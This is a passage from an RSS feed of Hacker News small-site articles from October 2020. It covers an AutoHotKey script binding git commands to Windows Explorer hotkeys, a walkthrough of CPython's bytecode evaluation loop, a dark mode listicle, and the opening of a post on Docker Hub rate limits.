target="_blank"><em>diffusion of responsibility</em></a><em>. ‘’The individual assumes that others either are responsible for taking action or have already done so.’’</em></p><p><em>*2 This is often …</em></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://younglingfeynman.com/essays/artofbusiness">http://younglingfeynman.com/essays/artofbusiness</a></em></p>]]>
            </description>
            <link>http://younglingfeynman.com/essays/artofbusiness</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951824</guid>
            <pubDate>Sat, 31 Oct 2020 14:38:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Windows Explorer as a Git IDE]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24951741">thread link</a>) | @todsacerdoti
<br/>
October 31, 2020 | http://john.ankarstrom.se/explorer-git-ide/ | <a href="https://web.archive.org/web/*/http://john.ankarstrom.se/explorer-git-ide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <td colspan="3">
            
            <div id="content">
              <p>I have a couple of different stationary computers. A
                custom-built PC running Windows, an iMac G3 running Mac
                OS 9 and an old HP microtower running Alpine Linux,
                acting as a home server of sorts. Out of all these, I
                spend most of my time on the Windows PC. I use Windows
                for the majority of my work, including a large part of
                the programming that I do.<br>
              </p>
              <p>Even though I mainly use Windows, most of my
                web/software development is grounded in or at least
                inspired by Unix in some way: most obviously, I use Git,
                which is a tool designed for the Unix shell. This turns
                out to be a rather awkward match: on the one hand, I use
                Windows Explorer to manage the files; on the other hand,
                I have a command prompt open to manage the repository.</p>
              <p>For my workflow, it would be much better if the Git
                commands were integrated into Explorer itself. So I
                added what amounts to the following code to <a href="http://git.ankarstrom.se/ahk.git/">my AutoHotKey
                  script</a>: <br>
              </p>
              <pre>GroupAdd, Explorer, ahk_class CabinetWClass<br>GroupAdd, Explorer, ahk_class ExploreWClass<p>#IfWinActive ahk_group Explorer</p><p>!a::Run, % "cmd /c cd "qp()" &amp; git add "qip()" &amp;&amp; git status &amp; pause"<br>!c::Run, % "cmd /c cd "qp()" &amp; git commit &amp; pause"<br>!+c::Run, % "cmd /c cd "qp()" &amp; git commit --amend &amp; pause"<br>!f::Run, % "cmd /c cd "qp()" &amp; git diff &amp; pause"<br>!+f::Run, % "cmd /c cd "qp()" &amp; git diff "qip()" &amp; pause"<br>!i::Run, % "cmd /c cd "qp()" &amp; git diff HEAD~1 HEAD &amp; pause"<br>!+i::Run, % "cmd /c cd "qp()" &amp; git diff HEAD~1 HEAD "qip()" &amp; pause"<br>!l::Run, % "cmd /c cd "qp()" &amp; git log &amp; pause"<br>!+l::Run, % "cmd /c cd "qp()" &amp; git log "qip()" &amp; pause"<br>!p::Run, % "cmd /c cd "qp()" &amp; git push &amp; pause"<br>!r::Run, % "cmd /c cd "qp()" &amp; git reset "qip()" &amp;&amp; git status &amp; pause"<br>!s::Run, % "cmd /c cd "qp()" &amp; git status &amp; pause"</p><p>#IfWinActive</p><p>Explorer(hwnd := "")<br>{<br>  ShellApp := ComObjCreate("Shell.Application")<br>  if (hwnd = "")<br>    WinGet, hwnd, id, A<br>  for window in ShellApp.Windows<br>    if (window.hwnd = hwnd)<br>      return window<br>  return -1<br>}</p><p>qp()<br>{<br>  return """" Explorer().Document.Folder.Self.path """"<br>}</p><p>qip()<br>{<br>  return """" Explorer().Document.FocusedItem.path """"<br>}</p></pre>
              <p>(The actual code is contained in <a href="http://git.ankarstrom.se/ahk.git/tree/tt.programs.explorer.ahk">this

                  file</a>, most of it near the bottom.) </p>
              <p>This adds a bunch of hotkeys to any Explorer window:</p>
              <dl>
                <dt><b>Alt-A</b></dt>
                <dd>"git add" the selected file; then "git status"<br>
                </dd>
                <dt><b>Alt-C</b></dt>
                <dd>"git commit"</dd>
                <dt><b>Alt-Shift-C</b></dt>
                <dd>"git commit --amend"</dd>
                <dt><b>Alt-F</b></dt>
                <dd>"git diff"</dd>
                <dt><b>Alt-Shift-F</b></dt>
                <dd>"git diff" the selected file</dd>
                <dt><b>Alt-I</b></dt>
                <dd>"git diff", comparing the previous and current
                  commit</dd>
                <dt><b>Alt-Shift-I</b></dt>
                <dd>"git diff" the selected file, comparing the previous
                  and current commit</dd>
                <dt><b>Alt-L</b></dt>
                <dd>"git log"</dd>
                <dt><b>Alt-Shift-L</b></dt>
                <dd>"git log" the selected file<br>
                </dd>
                <dt><b>Alt-P</b></dt>
                <dd>"git push"</dd>
                <dt><b>Alt-R</b></dt>
                <dd>"git reset" the selected file; then "git status"</dd>
                <dt><b>Alt-S</b></dt>
                <dd>"git status"</dd>
              </dl>
              <p>All of these hotkeys open a new command prompt window,
                displaying the results of the Git command, which the
                user can close by pressing any key.</p>
              <p>In my experience, these hotkeys make it incalculably
                less bothersome to work with Git on Windows, and I think
                it shows how incredibly useful even very simple
                AutoHotKey scripts can be. If you have any suggestions
                on other hotkeys, please write a comment below.<br>
              </p>
            </div>
            <hr> </td>
          <td rowspan="14">&nbsp;</td>
          <td rowspan="14" id="links">
            <p> <small> Published&nbsp;by John&nbsp;Ankarström on
                2020-10-31. </small> </p>
            <!--?php include('../1/links.partial.php') ?--> </td>
        </div></div>]]>
            </description>
            <link>http://john.ankarstrom.se/explorer-git-ide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951741</guid>
            <pubDate>Sat, 31 Oct 2020 14:28:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Python bytecode is executed]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24951649">thread link</a>) | @r4victor
<br/>
October 31, 2020 | https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/ | <a href="https://web.archive.org/web/*/https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      <p>We started this series with <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">an overview of the CPython VM</a>. We learned that to run a Python program, CPython first compiles it to bytecode, and we studied how the compiler works in <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/">part two</a>. <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-3-stepping-through-the-cpython-source-code/">Last time</a> we stepped through the CPython source code starting with the <code>main()</code> function until we reached the evaluation loop, a place where Python bytecode gets executed. The main reason why we spent time studying these things was to prepare for the discussion that we start today. The goal of this discussion is to understand how CPython does what we tell it to do, that is, how it executes the bytecode to which the code we write compiles.</p>
<p><strong>Note</strong>: In this post I'm referring to CPython 3.9. Some implementation details will certainly change as CPython evolves. I'll try to keep track of important changes and add update notes.</p>
<h3>Starting point</h3>
<p>Let's briefly recall what we learned in the previous parts. We tell CPython what to do by writing Python code. The CPython VM, however, understands only Python bytecode. This is the job of the compiler to translate Python code to bytecode. The compiler stores bytecode in a code object, which is a structure that fully describes what a code block, like a module or a function, does. To execute a code object, CPython first creates a state of execution for it called a frame object. Then it passes a frame object to a frame evaluation function to perform the actual computation. The default frame evaluation function is <code>_PyEval_EvalFrameDefault()</code> defined in <a href="https://github.com/python/cpython/blob/3.9/Python/ceval.c#L889">Python/ceval.c</a>. This function implements the core of the CPython VM. Namely, it implements the logic for the execution of Python bytecode. So, this function is what we're going to study today.</p>
<p>To understand how <code>_PyEval_EvalFrameDefault()</code> works, it is crucial to have an idea of what its input, a frame object, is. A frame object is a Python object defined by the following C struct:</p>
<div><pre><span></span><span>// typedef struct _frame PyFrameObject; in other place</span>
<span>struct</span> <span>_frame</span> <span>{</span>
    <span>PyObject_VAR_HEAD</span>
    <span>struct</span> <span>_frame</span> <span>*</span><span>f_back</span><span>;</span>      <span>/* previous frame, or NULL */</span>
    <span>PyCodeObject</span> <span>*</span><span>f_code</span><span>;</span>       <span>/* code segment */</span>
    <span>PyObject</span> <span>*</span><span>f_builtins</span><span>;</span>       <span>/* builtin symbol table (PyDictObject) */</span>
    <span>PyObject</span> <span>*</span><span>f_globals</span><span>;</span>        <span>/* global symbol table (PyDictObject) */</span>
    <span>PyObject</span> <span>*</span><span>f_locals</span><span>;</span>         <span>/* local symbol table (any mapping) */</span>
    <span>PyObject</span> <span>**</span><span>f_valuestack</span><span>;</span>    <span>/* points after the last local */</span>
    <span>/* Next free slot in f_valuestack.  Frame creation sets to f_valuestack.</span>
<span>       Frame evaluation usually NULLs it, but a frame that yields sets it</span>
<span>       to the current stack top. */</span>
    <span>PyObject</span> <span>**</span><span>f_stacktop</span><span>;</span>
    <span>PyObject</span> <span>*</span><span>f_trace</span><span>;</span>          <span>/* Trace function */</span>
    <span>char</span> <span>f_trace_lines</span><span>;</span>         <span>/* Emit per-line trace events? */</span>
    <span>char</span> <span>f_trace_opcodes</span><span>;</span>       <span>/* Emit per-opcode trace events? */</span>

    <span>/* Borrowed reference to a generator, or NULL */</span>
    <span>PyObject</span> <span>*</span><span>f_gen</span><span>;</span>

    <span>int</span> <span>f_lasti</span><span>;</span>                <span>/* Last instruction if called */</span>
    <span>int</span> <span>f_lineno</span><span>;</span>               <span>/* Current line number */</span>
    <span>int</span> <span>f_iblock</span><span>;</span>               <span>/* index in f_blockstack */</span>
    <span>char</span> <span>f_executing</span><span>;</span>           <span>/* whether the frame is still executing */</span>
    <span>PyTryBlock</span> <span>f_blockstack</span><span>[</span><span>CO_MAXBLOCKS</span><span>];</span> <span>/* for try and loop blocks */</span>
    <span>PyObject</span> <span>*</span><span>f_localsplus</span><span>[</span><span>1</span><span>];</span>  <span>/* locals+stack, dynamically sized */</span>
<span>};</span>
</pre></div>


<p>The <code>f_code</code> field of a frame object points to a code object. A code object is also a Python object. Here's its definition:</p>
<div><pre><span></span><span>struct</span> <span>PyCodeObject</span> <span>{</span>
    <span>PyObject_HEAD</span>
    <span>int</span> <span>co_argcount</span><span>;</span>            <span>/* #arguments, except *args */</span>
    <span>int</span> <span>co_posonlyargcount</span><span>;</span>     <span>/* #positional only arguments */</span>
    <span>int</span> <span>co_kwonlyargcount</span><span>;</span>      <span>/* #keyword only arguments */</span>
    <span>int</span> <span>co_nlocals</span><span>;</span>             <span>/* #local variables */</span>
    <span>int</span> <span>co_stacksize</span><span>;</span>           <span>/* #entries needed for evaluation stack */</span>
    <span>int</span> <span>co_flags</span><span>;</span>               <span>/* CO_..., see below */</span>
    <span>int</span> <span>co_firstlineno</span><span>;</span>         <span>/* first source line number */</span>
    <span>PyObject</span> <span>*</span><span>co_code</span><span>;</span>          <span>/* instruction opcodes */</span>
    <span>PyObject</span> <span>*</span><span>co_consts</span><span>;</span>        <span>/* list (constants used) */</span>
    <span>PyObject</span> <span>*</span><span>co_names</span><span>;</span>         <span>/* list of strings (names used) */</span>
    <span>PyObject</span> <span>*</span><span>co_varnames</span><span>;</span>      <span>/* tuple of strings (local variable names) */</span>
    <span>PyObject</span> <span>*</span><span>co_freevars</span><span>;</span>      <span>/* tuple of strings (free variable names) */</span>
    <span>PyObject</span> <span>*</span><span>co_cellvars</span><span>;</span>      <span>/* tuple of strings (cell variable names) */</span>
    <span>/* The rest aren't used in either hash or comparisons, except for co_name,</span>
<span>       used in both. This is done to preserve the name and line number</span>
<span>       for tracebacks and debuggers; otherwise, constant de-duplication</span>
<span>       would collapse identical functions/lambdas defined on different lines.</span>
<span>    */</span>
    <span>Py_ssize_t</span> <span>*</span><span>co_cell2arg</span><span>;</span>    <span>/* Maps cell vars which are arguments. */</span>
    <span>PyObject</span> <span>*</span><span>co_filename</span><span>;</span>      <span>/* unicode (where it was loaded from) */</span>
    <span>PyObject</span> <span>*</span><span>co_name</span><span>;</span>          <span>/* unicode (name, for reference) */</span>
    <span>PyObject</span> <span>*</span><span>co_lnotab</span><span>;</span>        <span>/* string (encoding addr&lt;-&gt;lineno mapping) See</span>
<span>                                   Objects/lnotab_notes.txt for details. */</span>
    <span>void</span> <span>*</span><span>co_zombieframe</span><span>;</span>       <span>/* for optimization only (see frameobject.c) */</span>
    <span>PyObject</span> <span>*</span><span>co_weakreflist</span><span>;</span>   <span>/* to support weakrefs to code objects */</span>
    <span>/* Scratch space for extra data relating to the code object.</span>
<span>       Type is a void* to keep the format private in codeobject.c to force</span>
<span>       people to go through the proper APIs. */</span>
    <span>void</span> <span>*</span><span>co_extra</span><span>;</span>

    <span>/* Per opcodes just-in-time cache</span>
<span>     *</span>
<span>     * To reduce cache size, we use indirect mapping from opcode index to</span>
<span>     * cache object:</span>
<span>     *   cache = co_opcache[co_opcache_map[next_instr - first_instr] - 1]</span>
<span>     */</span>

    <span>// co_opcache_map is indexed by (next_instr - first_instr).</span>
    <span>//  * 0 means there is no cache for this opcode.</span>
    <span>//  * n &gt; 0 means there is cache in co_opcache[n-1].</span>
    <span>unsigned</span> <span>char</span> <span>*</span><span>co_opcache_map</span><span>;</span>
    <span>_PyOpcache</span> <span>*</span><span>co_opcache</span><span>;</span>
    <span>int</span> <span>co_opcache_flag</span><span>;</span>  <span>// used to determine when create a cache.</span>
    <span>unsigned</span> <span>char</span> <span>co_opcache_size</span><span>;</span>  <span>// length of co_opcache.</span>
<span>};</span>
</pre></div>


<p>The most important field of a code object is <code>co_code</code>. It's a pointer to a Python bytes object representing the bytecode. The bytecode is a sequence of two-byte instructions: one byte for an opcode and one byte for an argument.</p>
<p>Don't worry if some members of the above structures are still a mystery to you. We'll see what they are used for as we move forward in our attempt to understand how the CPython VM executes the bytecode.</p>
<h3>Overview of the evaluation loop</h3>
<p>The problem of executing Python bytecode may seem a no-brainer to you. Indeed, all the VM has to do is to iterate over the instructions and to act according to them. And this is what essentially <code>_PyEval_EvalFrameDefault()</code> does. It contains an infinite <code>for (;;)</code> loop that we refer to as the evaluation loop. Inside that loop there is a giant <code>switch</code> statement over all possible opcodes. Each opcode has a corresponding <code>case</code> block containing the code for executing that opcode. The bytecode is represented by an array of 16-bit unsigned integers, one integer per instruction. The VM keeps track of the next instruction to be executed using the <code>next_instr</code> variable, which is a pointer to the array of instructions. At the start of each iteration of the evaluation loop, the VM calculates the next opcode and its argument by taking the least significant and the most significant byte of the next instruction respectively and increments <code>next_instr</code>. The <code>_PyEval_EvalFrameDefault()</code> function is nearly 3000 lines long, but its essence can be captured by the following simplified version:</p>
<div><pre><span></span><span>PyObject</span><span>*</span>
<span>_PyEval_EvalFrameDefault</span><span>(</span><span>PyThreadState</span> <span>*</span><span>tstate</span><span>,</span> <span>PyFrameObject</span> <span>*</span><span>f</span><span>,</span> <span>int</span> <span>throwflag</span><span>)</span>
<span>{</span>
    <span>// ... declarations and initialization of local variables</span>
    <span>// ... macros definitions</span>
    <span>// ... call depth handling</span>
    <span>// ... code for tracing and profiling</span>

    <span>for</span> <span>(;;)</span> <span>{</span>
        <span>// ... check if the bytecode execution must be suspended,</span>
        <span>// e.g. other thread requested the GIL</span>

        <span>// NEXTOPARG() macro</span>
        <span>_Py_CODEUNIT</span> <span>word</span> <span>=</span> <span>*</span><span>next_instr</span><span>;</span> <span>// _Py_CODEUNIT is a typedef for uint16_t</span>
        <span>opcode</span> <span>=</span> <span>_Py_OPCODE</span><span>(</span><span>word</span><span>);</span>
        <span>oparg</span> <span>=</span> <span>_Py_OPARG</span><span>(</span><span>word</span><span>);</span>
        <span>next_instr</span><span>++</span><span>;</span>

        <span>switch</span> <span>(</span><span>opcode</span><span>)</span> <span>{</span>
            <span>case</span> <span>TARGET</span><span>(</span><span>NOP</span><span>)</span> <span>{</span>
                <span>FAST_DISPATCH</span><span>();</span> <span>// more on this later</span>
            <span>}</span>

            <span>case</span> <span>TARGET</span><span>(</span><span>LOAD_FAST</span><span>)</span> <span>{</span>
                <span>// ... code for loading local variable</span>
            <span>}</span>

            <span>// ... 117 more cases for every possible opcode</span>
        <span>}</span>

        <span>// ... error handling</span>
    <span>}</span>

    <span>// ... termination</span>
<span>}</span>
</pre></div>


<p>To get a more realistic picture, let's discuss some of the omitted pieces in more detail.</p>
<h4>reasons to suspend the loop</h4>
<p>From time to time, the currently running thread stops executing the bytecode to do something else or to do nothing. This can happen due to one of the four reasons:</p>
<ul>
<li>There are signals to handle. When you register a function as a signal handler using <a href="https://docs.python.org/3/library/signal.html#signal.signal"><code>signal.signal()</code></a>, CPython stores this function in the array of handlers. The function that will actually be called when a thread receives a signal is <code>signal_handler()</code> (it's passed to the <a href="https://www.man7.org/linux/man-pages/man2/sigaction.2.html"><code>sigaction()</code></a> library function on Unix-like systems). When called, <code>signal_handler()</code> sets a boolean variable telling that the function in the array of handlers corresponding to the received signal has to be called. Periodically, the main thread of the main interpreter calls the tripped handlers.</li>
<li>There are pending calls to call. Pending calls is a mechanism that allows to schedule a function to be executed from the main thread. This mechanism is exposed by the Python/C API via the <a href="https://docs.python.org/3/c-api/init.html#c.Py_AddPendingCall"><code>Py_AddPendingCall()</code></a> function.</li>
<li>The asynchronous exception is raised. The asynchronous exception is an exception set in one thread from another. This can be done using the <a href="https://docs.python.org/3/c-api/init.html#c.PyThreadState_SetAsyncExc"><code>PyThreadState_SetAsyncExc()</code></a> function provided by the Python/C API.</li>
<li>The currently running thread is requested to drop the GIL. When it sees such a request, it drops the GIL and waits until it acquires the GIL again.</li>
</ul>
<p>CPython has indicators for each of these events. The variable indicating that there are handlers to call is a member of <code>runtime-&gt;ceval</code>, which is a <code>_ceval_runtime_state</code> struct:</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/</a></em></p>]]>
            </description>
            <link>https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951649</guid>
            <pubDate>Sat, 31 Oct 2020 14:15:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Dark Mode Matters]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 57 (<a href="https://news.ycombinator.com/item?id=24951606">thread link</a>) | @desoga
<br/>
October 31, 2020 | https://thecodeangle.com/5-reasons-why-dark-mode-matters/ | <a href="https://web.archive.org/web/*/https://thecodeangle.com/5-reasons-why-dark-mode-matters/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1527" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
	
<div>

	
	<!-- .entry-header -->

	
	<div itemprop="text">

		
		<blockquote><p><em>When it is dark enough, you can see the stars.</em><br>
<em>―&nbsp;</em></p></blockquote>
<h2>Table of Contents</h2>
<ul>
<li><em><strong><a href="#introduction">Introduction</a></strong></em></li>
<li><em><strong><a href="#reasons-for-dark-mode">Reasons for Dark Mode</a></strong></em>
<ul>
<li><em><strong><a href="#visual-attraction">Visual Attraction</a></strong></em></li>
<li><em><strong><a href="#user-experience">User Experience</a></strong></em></li>
<li><em><strong><a href="#eye-strain">Eye Strain &amp;&nbsp;</a></strong></em><em><strong>Blue Light Removal</strong></em></li>
<li><em><strong><a href="#reduction-of-photophobia">Reduction of Photophobia</a></strong></em></li>
<li><em><strong><a href="#battery-saver">Battery Saver</a></strong></em></li>
</ul>
</li>
<li><em><strong><a href="#factors-to-consider">Factors to Consider When Selecting Dark Mode</a></strong></em></li>
<li><em><strong><a href="#conclusion">Conclusion</a></strong></em></li>
</ul>

<h2>Introduction</h2>
<p>According to an <a href="https://en.wikipedia.org/wiki/Screen_time#Statistics" target="_blank" rel="noopener noreferrer">American survey,</a> children&nbsp;between the ages of 8-12 and 13-18 spend a daily average of 4 hours, 44 minutes and 7 hours, 22 minutes respectively, staring at screens.</p>
<p>The data for these numbers were collected in 2019. For adults, this figure is higher and according to an article on the <a href="https://www.washingtonpost.com/technology/2020/03/24/screen-time-iphone-coronavirus-quarantine-covid/" target="_blank" rel="noopener noreferrer">Washington Post </a>earlier this year, the amount of screen time increased considerably during the quarantine period due to <strong>COVID-19</strong></p>
<p>Today, mobile devices take a large percentage of the amount of time people spend staring at screens, this is why there is a need for applications to have a <strong>Dark Mode</strong> option for its users.</p>
<p><strong>Dark Mode</strong> according to <strong>Wikipedia,</strong><em> is a color scheme that uses light-coloured text, icons, and graphical user interface elements on a dark background and is often discussed in terms of computer user interface design and web design.</em></p>
<p>Now, let us look at the 5 reasons why <strong>Dark Mode</strong> really matters for the end-users of an application!<br>
<a name="reasons-for-dark-mode"></a></p>
<h2>Reasons For Dark Mode</h2>
<p><img src="https://thecodeangle.com/wp-content/uploads/2020/10/visual_apeal-300x200.jpg" alt="visual appeal" width="1055" height="703" srcset="https://thecodeangle.com/wp-content/uploads/2020/10/visual_apeal-300x200.jpg 300w, https://thecodeangle.com/wp-content/uploads/2020/10/visual_apeal-1024x683.jpg 1024w, https://thecodeangle.com/wp-content/uploads/2020/10/visual_apeal-768x512.jpg 768w, https://thecodeangle.com/wp-content/uploads/2020/10/visual_apeal-1536x1024.jpg 1536w, https://thecodeangle.com/wp-content/uploads/2020/10/visual_apeal.jpg 1920w" sizes="(max-width: 1055px) 100vw, 1055px"><br>
<a name="visual-attraction"></a></p>
<h3>1). Visual Attraction</h3>
<p><strong>Dark Mode</strong> when applied in the right manner always looks really appealing to the eye. It provides the opportunity to present a unique user interface to the end-users of an application.</p>
<p>Also, in terms of data presentation for graphical contents like dashboards that contain graphs and charts, <strong>Dark Mode</strong> brings out the elegance in the design as shown below.</p>
<p><img src="https://thecodeangle.com/wp-content/uploads/2020/10/darkmode-300x156.png" alt="Dark Mode" width="1106" height="575" srcset="https://thecodeangle.com/wp-content/uploads/2020/10/darkmode-300x156.png 300w, https://thecodeangle.com/wp-content/uploads/2020/10/darkmode-1024x531.png 1024w, https://thecodeangle.com/wp-content/uploads/2020/10/darkmode-768x398.png 768w" sizes="(max-width: 1106px) 100vw, 1106px"></p>
<p>Unlike the drab white look that most applications have, the above image shows how <strong>Dark Mode</strong> can bring a significantly deeper and more attractive visual perception to an application.<br>
<a name="user-experience"></a></p>
<h3>2). User Experience</h3>
<p>Providing the users of a product with the option of a <strong>Dark Mode</strong> is a good business decision, especially if the application requires users to spend lots of time on the application. A streaming site, for example, implementing a dark mode feature is a good business decision.</p>
<p>Streaming a video in <strong>light-mode</strong> under a dark environment or at night may not be a good experience for the eyes. Hence, applications that require people spending lots of screen time should provide an option for <strong>Dark Mode</strong> for a better user experience.</p>
<p>Above all, it is worthy to note that context is a key factor in making decisions on whether to implement the option of a <strong>Dark Mode</strong>.<br>
<a name="eye-strain"></a></p>
<h3>3). Eye Strain &amp; Blue Light Removal</h3>
<p>By default, <strong>Dark Mode</strong> helps to reduce overall screen brightness. Although no study has outrightly confirmed that <strong>Dark Mode</strong> reduces eye strain, it can, however, be effective in low-light conditions.</p>
<p>Also, <strong>Dark Mode</strong> helps to reduce exposure to <strong>Blue Light.</strong>&nbsp;Blue light is a high-frequency colour in the “visible light spectrum” that can be seen by the human eye.</p>
<p><img src="https://thecodeangle.com/wp-content/uploads/2020/10/blue-light-300x200.jpg" alt="blue-light" width="990" height="660" srcset="https://thecodeangle.com/wp-content/uploads/2020/10/blue-light-300x200.jpg 300w, https://thecodeangle.com/wp-content/uploads/2020/10/blue-light-1024x683.jpg 1024w, https://thecodeangle.com/wp-content/uploads/2020/10/blue-light-768x512.jpg 768w, https://thecodeangle.com/wp-content/uploads/2020/10/blue-light-1536x1024.jpg 1536w, https://thecodeangle.com/wp-content/uploads/2020/10/blue-light.jpg 1920w" sizes="(max-width: 990px) 100vw, 990px"></p>
<p><strong>Blue Light&nbsp;</strong>can be found almost everywhere, from smartphones to computers and other digital devices. Another source of Blue Light is the sun, so by stepping out of your house, you are exposed to a certain degree of blue light.</p>
<p>Too many exposures to Blue Light can lead to digital eye strain.</p>
<p>Since not everyone can see well with <strong>Dark Mode</strong>, some mobile devices provide the option for Blue Light filters. This can be found in the display settings area and can be easily adjusted to the level of blue light exposure you want.<br>
<a name="reduction-of-photophobia"></a></p>
<h3>4). Reduction of Photophobia</h3>
<p>Photophobia is a symptom of abnormal intolerance to the visual perception of light. The source of this light could be any form of light source including sunlight.</p>
<p>There are so many things that can cause photophobia, some of which includes:</p>
<ul>
<li>Excessive light entering the eyes</li>
<li>Eye infection</li>
<li>Medications</li>
<li>Meningitis</li>
<li>Lack of eye pigment (Albinism)</li>
<li>Wearing contact lenses for an extended period of time, or wearing it wrongly.</li>
<li>Post Eye Surgery</li>
</ul>
<p>Photophobia usually disappears once the underlying cause is treated. A good way to deal with photophobia is making use of the <strong>Dark Mode </strong>of a mobile device or an application. This helps to reduce the amount of bright light that goes directly into the eyes.</p>
<p>An extension you may consider installing on your desktop browser is &nbsp;<a href="https://nighteye.app/" target="_blank" rel="noopener noreferrer">Night Eye</a>. It is supported by almost all major web browsers. It helps you enable <strong>Dark Mode </strong>and other features across almost all the websites you view, to help cope with the light sensitivity.</p>
<p>However, if light sensitivity persists, you may want to see your doctor!<br>
<a name="battery-saver"></a></p>
<h3>5). Battery Saver</h3>
<p>Another positive impact of <strong>Dark Mode</strong> is the impact it has on the battery life of mobile devices. <strong>Dark Mode </strong>can significantly help reduce the battery drain on devices which use OLED(Organic Light-Emitting Diode) screens.</p>
<p><img src="https://thecodeangle.com/wp-content/uploads/2020/10/battery-saver-205x300.jpg" alt="battery-saver" width="952" height="1393" srcset="https://thecodeangle.com/wp-content/uploads/2020/10/battery-saver-205x300.jpg 205w, https://thecodeangle.com/wp-content/uploads/2020/10/battery-saver-699x1024.jpg 699w, https://thecodeangle.com/wp-content/uploads/2020/10/battery-saver-768x1125.jpg 768w" sizes="(max-width: 952px) 100vw, 952px"></p>
<p>Numerous studies have confirmed the fact that <strong>Dark Mode</strong> saves battery life. In an<a href="https://www.youtube.com/watch?v=UljafaxRcEE" target="_blank" rel="noopener noreferrer"> Android Dev Summit</a> in November of 2018, Google also confirmed that themes on android devices have a significant impact on the battery life of a mobile device.</p>
<p>If you are using an Android device, you should consider using <strong>Dark Mode</strong>, especially at night. Not only is it easy on the eyes, but it also helps save your battery life.<br>
<a name="factors-to-consider"></a></p>
<h3>Factors To Consider When Selecting Dark Mode</h3>
<p>In as much as <strong>Dark Mode</strong> seems trendy, it is necessary to consider some factors before deciding to implement it in an application. Some of these factors are discussed below:</p>
<p><strong>Readability and Visibility:&nbsp;</strong>Readability simply means the ease at which a reader can easily understand or perceive a written text. Applications that contain lots of text in their interface will have to be careful about how <strong>Dark Mode</strong> is implemented.</p>
<p>If the <strong>Dark Mode</strong> is not well implemented, this will lead to a poor user experience with the users struggling to read the texts. This defeats one of the purposes for which <strong>Dark Mode</strong> is created and could lead to eye strain.</p>
<p>Lots of research must go into how the backgrounds, text colour and font will work together.</p>
<p><strong>Test Before Implementation:&nbsp;&nbsp;</strong>Testing helps to discover the strength and weakness of the Color scheme used in an application. <strong>Dark Mode</strong> does not work well for all applications. A website that contains lots of elements(text, images, tables) may make it difficult for <strong>Dark Mode</strong> to be implemented.</p>
<p>Other factors to consider include:</p>
<ul>
<li>Determination of the target audience</li>
<li>Providing an option to switch between Light Mode and Dark Mode</li>
<li>The Environment</li>
<li>Accessibility</li>
</ul>

<h3>Conclusion</h3>
<p>The decision to always use <strong>Dark Mode </strong>should always be a relative one. For users of an application, knowing when to use light mode and <strong>Dark Mode </strong>at different times of the day is very essential for the eye.</p>

		
		
			</div><!-- .entry-content .clear -->
</div>

	
</article></div>]]>
            </description>
            <link>https://thecodeangle.com/5-reasons-why-dark-mode-matters/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951606</guid>
            <pubDate>Sat, 31 Oct 2020 14:10:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Preparing for the Docker Hub Rate Limits]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24951563">thread link</a>) | @alexellisuk
<br/>
October 31, 2020 | https://inlets.dev/blog/2020/10/29/preparing-docker-hub-rate-limits.html | <a href="https://web.archive.org/web/*/https://inlets.dev/blog/2020/10/29/preparing-docker-hub-rate-limits.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>On Nov 1st, all images pulled from the Docker Hub will be subjected to severe limits, which will affect all Kubernetes users. Learn what solutions exist, and how how to prepare.</p>

<h2 id="introduction">Introduction</h2>

<p><a href="https://inlets.dev/blog/2020/10/29/Docker">Docker</a> is both a company and <a href="https://github.com/docker/docker">an Open Source project</a> which revolutionised how users deploy code to production. Containers rather than Virtual Machines (VMs) are now considered the lingua franca of deployments, and containers are packed in “images”. These images need to be distributed through a container registry, such as the registry created and operated by Docker called the <a href="https://hub.docker.com/">Docker Hub</a>.</p>

<p><img src="https://inlets.dev/images/2020-10-preparing-docker-hub/containers.jpg" alt="Container shipment"></p>

<p>Up until recently, public images were able to be pulled as many times as needed by a user with no rate-limiting, gating, or payments getting in the way. On Nov 1st, that is all going to change an the following will come into play:</p>

<ul>
  <li>Unauthenticated users: 100 pulls / 6 hours</li>
  <li>Authenticated users: 200 pulls / 6 hours</li>
  <li>Paying, authenticated users: unlimited downloads</li>
</ul>

<p>See also: <a href="https://www.docker.com/pricing">Docker Hub rate limits &amp; pricing</a></p>

<p><a href="https://kubernetes.io/">Kubernetes</a> users will be most affected, since it’s very common to push and pull images during development many times with each revision of a container. Even bootstrapping a cluster with 10 nodes, each of which needs 10 containers just for its control-plane and could exhaust the unauthenticated limit before you’ve even started getting to the real work. This is compacted where companies use a shared IP address, shared cloud infrastructure, or a VPN, as the Docker Hub will use the shared IP address.</p>

